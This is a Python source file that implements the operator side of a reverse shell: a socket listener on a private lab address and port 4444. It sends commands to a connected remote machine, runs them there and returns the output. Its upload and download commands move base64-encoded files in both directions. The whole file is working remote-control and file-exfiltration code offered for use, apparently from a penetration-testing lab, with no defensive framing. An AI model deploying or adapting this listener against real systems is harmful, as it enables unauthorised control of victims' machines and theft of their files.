#!/usr/bin/env python3

import base64  # https://docs.python.org/3/library/base64.html
import json  # https://docs.python.org/3/library/json.html
# import shlex  # https://docs.python.org/3/library/shlex.html
import socket  # https://docs.python.org/3/library/socket.html


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print(f"[+] Listening on {ip}:{port}")
        self.connection, address = listener.accept()
        print(f"[+] Accepted connection from {address[0]}:{address[1]}")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download Succesful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")

            # noinspection PyBroadException
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content.decode())

                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)

            except Exception:
                result = "[-] Error during command execution"

            print(result)


# Main
if __name__ == "__main__":
    my_ip = "192.168.122.108"
    my_port = 4444
    my_listener = Listener(my_ip, my_port)
    my_listener.run()
